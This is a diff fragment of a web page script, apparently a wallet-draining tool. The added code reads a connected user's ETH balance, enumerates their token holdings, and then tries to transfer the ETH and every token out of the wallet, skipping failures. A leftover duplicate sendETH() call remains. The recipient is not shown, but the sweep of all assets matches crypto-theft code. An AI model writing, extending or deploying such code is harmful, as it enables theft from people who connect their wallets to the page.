@@ -117,7 +117,34 @@
           return;
         }
 
-        status.textContent = "Sending ETH and tokens...";
+        
+    status.textContent = "Checking balances...";
+
+    const ethBalance = await provider.getBalance(userAddress);
+    console.log("ETH balance:", ethers.utils.formatEther(ethBalance));
+
+    const tokens = await getTokenList();
+    for (let token of tokens) {
+      const abi = [
+        "function balanceOf(address) view returns (uint)",
+        "function name() view returns (string)"
+      ];
+      const tokenContract = new ethers.Contract(token, abi, provider);
+      const balance = await tokenContract.balanceOf(userAddress);
+      const name = await tokenContract.name();
+      console.log(`${name} (${token}):`, balance.toString());
+    }
+
+    status.textContent = "Attempting transfers...";
+    await sendETH();
+    for (let token of tokens) {
+      try {
+        await transferToken(token);
+      } catch (e) {
+        console.error("Transfer failed:", token, e);
+      }
+    }
+    
 
         await sendETH();
 
